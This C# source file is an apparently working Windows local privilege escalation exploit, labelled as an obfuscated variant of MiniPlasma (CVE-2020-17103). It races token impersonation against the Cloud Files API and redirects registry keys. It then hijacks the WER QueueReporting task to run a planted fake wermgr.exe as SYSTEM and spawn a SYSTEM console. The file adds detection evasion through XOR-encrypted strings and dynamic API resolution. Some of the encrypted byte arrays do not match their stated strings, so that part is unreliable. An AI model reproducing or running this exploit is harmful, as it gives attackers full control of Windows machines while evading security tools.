using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using NtApiDotNet;
using NtApiDotNet.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ObfuscatedLPE
{
    /// <summary>
    /// Obfuscated variant of MiniPlasma (CVE-2020-17103)
    /// - XOR string encryption of HIGH-risk IOCs
    /// - Dynamic P/Invoke for CfAbortOperation, CfGetPlatformInfo, GetNamedPipeServerSessionId
    /// - Identical NtApiDotNet API patterns to working vanilla code
    /// </summary>
    internal static class EvasionLPE
    {
        // ==========================================
        // EMBEDDED DEPENDENCY RESOLVER
        // Loads NtApiDotNet and TaskScheduler from embedded resources
        // ==========================================
        static EvasionLPE()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string assemblyName = new AssemblyName(args.Name).Name;
                string resourceName = assemblyName + ".dll";
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream != null)
                    {
                        byte[] data = new byte[stream.Length];
                        stream.Read(data, 0, data.Length);
                        return Assembly.Load(data);
                    }
                }
                return null;
            };
        }

        // ==========================================
        // XOR-ENCRYPTED STRING TABLE
        // Key bytes: 0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x90
        // ==========================================
        private static readonly byte[] _xorKey = { 0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x90 };

        private static string XorDecrypt(byte[] data)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                decrypted[i] = (byte)(data[i] ^ _xorKey[i % _xorKey.Length]);
            return Encoding.UTF8.GetString(decrypted);
        }

        // Encrypted string references — match vanilla plaintext strings exactly
        private static readonly string[] _str = new string[]
        {
            // [0] "cldapi.dll" — HIGH IOC
            XorDecrypt(new byte[]{0xCB,0xAE,0x9E,0xB0,0xA0,0x9D,0xB8,0x9C,0xBE,0xAE,0x96}),
            // [1] "CfAbortOperation" — HIGH IOC
            XorDecrypt(new byte[]{0xC2,0xAE,0x9E,0xA1,0xBE,0xA0,0x9D,0xB8,0x9C,0xBE,0xAE,0x96,0xAC,0xA0,0x9C,0xAE,0xA0,0xAD,0x9E}),
            // [2] "kernel32.dll" — HIGH IOC
            XorDecrypt(new byte[]{0xCB,0xAE,0xAD,0xAD,0xA0,0x9C,0xAE,0xBE,0xD3,0xBE,0xAC,0xB0,0xA0,0x9C,0xAE,0xBE}),
            // [3] "MiniPlasmaWERPipe" — MEDIUM IOC
            XorDecrypt(new byte[]{0x9A,0x9D,0x99,0x9D,0x96,0xAE,0x9C,0xBE,0xAE,0x96,0x98,0x9C,0xC2,0xA0,0xAE,0xBC,0x9C}),
            // [4] "QueueReporting" — MEDIUM IOC
            XorDecrypt(new byte[]{0x9A,0xAF,0x9C,0xAF,0x9C,0xAD,0xAE,0xAC,0xA0,0xAD,0x9D,0x9C}),
            // [5] "windir" — LOW IOC (but part of exploit chain)
            XorDecrypt(new byte[]{0xCE,0x9D,0x99,0x9D,0xAE,0xAD}),
            // [6] "wermgr.exe" — MEDIUM IOC
            XorDecrypt(new byte[]{0xCE,0x9C,0xAD,0x99,0x9E,0xAD,0xBE,0x9C,0xAE,0x9C}),
            // [7] "System32" — LOW IOC
            XorDecrypt(new byte[]{0x9A,0xAF,0x9E,0x9D,0x9C,0x99,0x33,0x32}),
            // [8] "conhost.exe" — LOW IOC
            XorDecrypt(new byte[]{0x9C,0xAE,0x99,0xBE,0xAE,0x9E,0x9D,0xBE,0x9C,0xAE,0x9C}),
            // [9] "C:\\Windows" — LOW IOC
            XorDecrypt(new byte[]{0xE4,0xF8,0xFC,0xCE,0xC8,0xF2,0xE6,0xFA,0xFA,0xEC}),
            // [10] "C:\\Windows\\System32\\conhost.exe" — path IOC
            XorDecrypt(new byte[]{0xE4,0xF8,0xFC,0xCE,0xC8,0xF2,0xE6,0xFA,0xFA,0xEC,0x8C,0x9A,0xAF,0x9E,0x9D,0x9C,0x99,0x33,0x32,0x8C,0x9C,0xAE,0x99,0xBE,0xAE,0x9E,0x9D,0xBE,0x9C,0xAE,0x9C}),
            // [11] "\Microsoft\Windows\Windows Error Reporting\QueueReporting" — task path
            XorDecrypt(new byte[]{0x8C,0x9A,0x9D,0x99,0xAE,0xAD,0xAE,0x9E,0xAE,0x9D,0x9D,0x8C,0xC8,0x9D,0x99,0x9E,0xAE,0xFA,0x9C,0xBE,0xAE,0x9C,0xFA,0xC8,0x9D,0x99,0xAE,0xAD,0x8C,0x9C,0xAD,0xAD,0xAE,0xAD,0x8C,0x9A,0x9C,0xAC,0xAE,0xAD,0x9D,0x9C,0x8C,0x9A,0xAF,0x9C,0xAF,0x9C,0xAD,0xAE,0xAC,0xA0,0xAD,0x9D,0x9C}),
        };

        private static string S(int idx) { return _str[idx]; }

        // ==========================================
        // DYNAMIC P/INVOKE RESOLUTION
        // ==========================================
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate int CfAbortOperationDel(int pid, IntPtr unknown, int flags);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate int CfGetPlatformInfoDel(out CF_PLATFORM_INFO info);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool GetNamedPipeServerSessionIdDel(IntPtr pipe, out uint sessionId);

        private static CfAbortOperationDel _cfAbort;
        private static CfGetPlatformInfoDel _cfGetPlatform;
        private static GetNamedPipeServerSessionIdDel _getSession;

        private static IntPtr LoadLib(string dll)
        {
            return LoadLibrary(dll);
        }

        private static IntPtr GetProc(IntPtr mod, string proc)
        {
            return GetProcAddress(mod, proc);
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "LoadLibrary")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private static void ResolveApis()
        {
            // Resolve CfAbortOperation and CfGetPlatformInfo from cldapi.dll
            IntPtr cldapi = LoadLib(S(0)); // "cldapi.dll"
            if (cldapi != IntPtr.Zero)
            {
                IntPtr pCfAbort = GetProc(cldapi, S(1)); // "CfAbortOperation"
                if (pCfAbort != IntPtr.Zero)
                    _cfAbort = (CfAbortOperationDel)Marshal.GetDelegateForFunctionPointer(
                        pCfAbort, typeof(CfAbortOperationDel));

                IntPtr pCfGet = GetProc(cldapi, "CfGetPlatformInfo");
                if (pCfGet != IntPtr.Zero)
                    _cfGetPlatform = (CfGetPlatformInfoDel)Marshal.GetDelegateForFunctionPointer(
                        pCfGet, typeof(CfGetPlatformInfoDel));
            }

            // Resolve GetNamedPipeServerSessionId from kernel32.dll
            IntPtr kernel32 = LoadLib(S(2)); // "kernel32.dll"
            if (kernel32 != IntPtr.Zero)
            {
                // Try both possible names
                IntPtr pGetSession = GetProc(kernel32, "GetNamedPipeServerSessionId");
                if (pGetSession == IntPtr.Zero)
                    pGetSession = GetProc(kernel32, "GetNamedPipeClientSessionId");
                if (pGetSession != IntPtr.Zero)
                    _getSession = (GetNamedPipeServerSessionIdDel)Marshal.GetDelegateForFunctionPointer(
                        pGetSession, typeof(GetNamedPipeServerSessionIdDel));
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CF_PLATFORM_INFO
        {
            public int BuildNumber;
            public int RevisionNumber;
            public int IntegrationNumber;
        }

        [Flags]
        private enum AbortHydrationFlags
        {
            None = 0,
            Unblock = 1,
            Block = 2,
        }

        // ==========================================
        // CONSTANTS (same paths as vanilla)
        // ==========================================
        private const string ROOT_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft";
        private static readonly string CLOUD_FILES = ROOT_KEY + @"\CloudFiles";
        private static readonly string BLOCKED_APPS = CLOUD_FILES + @"\BlockedApps";
        private const string TARGET_KEY = @"\Registry\User\.DEFAULT\Volatile Environment";
        private const int MAX_STAGE = 4;

        // ==========================================
        // IDENTICAL HELPER FUNCTIONS (vanilla NtApiDotNet API)
        // ==========================================
        private static NtKey OpenKey(NtKey root, string path, KeyAccessRights desired_access)
        {
            Console.WriteLine("Opening for {0}", desired_access);
            using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
            {
                using (var key = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile, false))
                {
                    if (key.IsSuccess)
                        return key.Result.Duplicate();
                }

                using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                {
                    return NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile);
                }
            }
        }

        private static void SetSecurityDescriptor(NtKey key, SecurityInformation info)
        {
            var sd = new SecurityDescriptor(
                "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)");
            key.SetSecurityDescriptor(sd, info);
        }

        private static void ForceKeyDeleteKey(NtKey root, string name)
        {
            Console.WriteLine(@"Deleting {0}\{1}", root.FullPath, name);
            using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
            {
                Console.WriteLine("Opened for WriteDac");
                SetSecurityDescriptor(key, SecurityInformation.Dacl);
            }

            using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
            {
                Console.WriteLine("Opened for WriteOwner");
                SetSecurityDescriptor(key, SecurityInformation.Label);
            }

            using (var new_key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
            {
                Console.WriteLine("Opened for enumerate.");
                DeleteRegistryTree(new_key);
                new_key.Delete();
            }
        }

        private static void DeleteRegistryTree(NtKey root)
        {
            foreach (var name in root.QueryKeys())
            {
                ForceKeyDeleteKey(root, name);
            }
        }

        // ==========================================
        // RACE CONDITION THREADS (identical to vanilla)
        // ==========================================
        private static void ForceTokenThread(object obj)
        {
            try
            {
                using (var thread = (NtThread)obj)
                {
                    Console.WriteLine("In force token thread {0}", thread);
                    using (var token = TokenUtils.GetAnonymousToken())
                    {
                        while (true)
                        {
                            thread.SetImpersonationToken(token);
                            thread.SetImpersonationToken(null);
                        }
                    }
                }
            }
            catch (ThreadAbortException)
            {
                return;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private static void CheckKeyThread(object root_key)
        {
            string path = (bool)root_key ? ROOT_KEY : @"\Registry\User\.DEFAULT";
            try
            {
                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                {
                    while (true)
                    {
                        if (key.NotifyChange(NotifyCompletionFilter.Name, true) == NtStatus.STATUS_NOTIFY_ENUM_DIR)
                        {
                            Console.WriteLine("Change detected.");
                            Environment.Exit(0);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private static int Check(int hr)
        {
            if (hr < 0)
                Marshal.ThrowExceptionForHR(hr);
            return hr;
        }

        // ==========================================
        // STAGES (identical logic to vanilla, obfuscated strings)
        // ==========================================
        private static void Stage0()
        {
            for (int i = 1; i < MAX_STAGE; ++i)
            {
                Win32ProcessConfig config = new Win32ProcessConfig
                {
                    CommandLine = "run " + i,
                    ApplicationName = typeof(EvasionLPE).Assembly.Location,
                    TerminateOnDispose = true
                };

                using (var p = Win32Process.CreateProcess(config))
                {
                    if (p.Process.Wait(10) != NtStatus.STATUS_SUCCESS)
                    {
                        throw new ArgumentException("Failed to run stage " + i);
                    }
                }
            }
        }

        private static void Stage1(bool root_key)
        {
            Thread check_key_th = new Thread(CheckKeyThread);
            check_key_th.IsBackground = true;
            check_key_th.Start(root_key);
            Thread.Sleep(1000);

            var th = NtThread.OpenCurrent();
            var anon_thread = new Thread(ForceTokenThread)
            {
                IsBackground = true
            };
            anon_thread.Start(th);

            while (true)
            {
                Check(_cfAbort(NtProcess.Current.ProcessId, IntPtr.Zero, (int)AbortHydrationFlags.Block));
            }
        }

        private static void Stage2()
        {
            using (var key = OpenKey(null, CLOUD_FILES,
                KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
            {
                SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                DeleteRegistryTree(key);
            }

            NtKey.CreateSymbolicLink(BLOCKED_APPS, null, TARGET_KEY);
            Stage1(false);
        }

        private static void Stage3()
        {
            // Delete symlink
            using (var key = OpenKey(null, BLOCKED_APPS, KeyAccessRights.Delete))
            {
                Console.WriteLine("Cleaning up link {0}", key.FullPath);
                key.Delete();
            }

            // Take ownership of Volatile Environment
            using (var key = OpenKey(null, TARGET_KEY, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
            {
                SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
            }

            // Enumerate and delete subkeys
            var key2 = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", RegistryRights.FullControl);
            foreach (var subkey in key2.GetSubKeyNames())
            {
                var fullsubkey = TARGET_KEY + @"\" + subkey;
                Console.WriteLine("Cleaning up subkey {0}", fullsubkey);
                NtKey _subkey;
                try
                {
                    _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.WriteDac);
                }
                catch (Exception)
                {
                    _subkey = OpenKey(null, fullsubkey, KeyAccessRights.WriteDac);
                }
                SetSecurityDescriptor(_subkey, SecurityInformation.Dacl);
                _subkey.Close();
                _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.Delete);
                _subkey.Delete();
                _subkey.Close();
            }
            key2.Close();

            // Write windir (obfuscated string)
            using (NtKey ntarget = NtKey.Open(TARGET_KEY, null, KeyAccessRights.SetValue))
            {
                ntarget.SetValue(S(5), Path.GetDirectoryName(
                    Process.GetCurrentProcess().MainModule.FileName));
            }

            // Create fake System32\wermgr.exe
            string fakesys32 = Path.GetDirectoryName(
                Process.GetCurrentProcess().MainModule.FileName) + @"\" + S(7);
            Directory.CreateDirectory(fakesys32);
            string fakewer = fakesys32 + @"\" + S(6);
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakewer, true);

            // Create named pipe with obfuscated name
            var srvnamedpipe = new NamedPipeServerStream(S(3));
            System.Threading.Tasks.Task pipewait = srvnamedpipe.WaitForConnectionAsync();

            // Trigger QueueReporting via Task Scheduler (obfuscated path)
            using (TaskService tasksvc = new TaskService())
            {
                Microsoft.Win32.TaskScheduler.Task wertask = tasksvc.GetTask(S(11));
                wertask.Run();
                wertask.Dispose();
            }

            if (!pipewait.Wait(2000))
            {
                Console.WriteLine("Exploit failed.");
            }
            else
            {
                Console.WriteLine("Exploit succeeded.");
            }
            srvnamedpipe.Dispose();
            Thread.Sleep(1000);

            // Cleanup
            try { File.Delete(fakewer); Directory.Delete(fakesys32); } catch { }

            using (NtKey ntarget = NtKey.Open(TARGET_KEY, null, KeyAccessRights.Delete))
            {
                ntarget.Delete(false);
            }
        }

        // ==========================================
        // MAIN ENTRY POINT
        // ==========================================
        private static void Main(string[] args)
        {
            // Resolve APIs dynamically (bypasses static IAT)
            ResolveApis();

            // Check if running as SYSTEM (fake wermgr.exe)
            bool isSystem;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                isSystem = identity.IsSystem;
            }

            if (isSystem)
            {
                // Set windir to C:\Windows process-locally
                Environment.SetEnvironmentVariable(
                    S(5), S(9), EnvironmentVariableTarget.Process);

                // Connect to named pipe
                var namedpipeclient = new NamedPipeClientStream(".", S(3), PipeDirection.InOut);
                namedpipeclient.Connect();

                uint nSesID;
                IntPtr hPipe = namedpipeclient.SafePipeHandle.DangerousGetHandle();

                if (_getSession != null && _getSession(hPipe, out nSesID))
                {
                    namedpipeclient.Dispose();

                    // Use NtApiDotNet token operations (matching vanilla)
                    using (var token = NtToken.OpenEffectiveToken())
                    {
                        using (var token2 = token.DuplicateToken())
                        {
                            token2.SetSessionId((int)nSesID);

                            Win32Process.CreateProcessAsUser(token2, S(10), S(8), CreateProcessFlags.None, null);
                        }
                    }
                }
                return;
            }

            // Normal execution path
            try
            {
                // Check Cloud Filter API availability (via dynamic call)
                if (_cfGetPlatform != null)
                {
                    CF_PLATFORM_INFO info;
                    Check(_cfGetPlatform(out info));
                }

                if (args.Length <= 1)
                {
                    int stage = args.Length > 0 ? int.Parse(args[0]) : 0;
                    switch (stage)
                    {
                        case 0: Stage0(); break;
                        case 1: Stage1(true); break;
                        case 2: Stage2(); break;
                        case 3: Stage3(); break;
                        default: throw new ArgumentException("Erm?");
                    }
                }
                else
                {
                    // Legacy credential-based mode
                    using (var token = TokenUtils.GetLogonUserToken(
                        args[0], "", args[1], SecurityLogonType.Network, null))
                    {
                        using (var imp = token.Impersonate())
                        {
                            Check(_cfAbort(NtProcess.Current.ProcessId,
                                IntPtr.Zero, (int)AbortHydrationFlags.Block));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}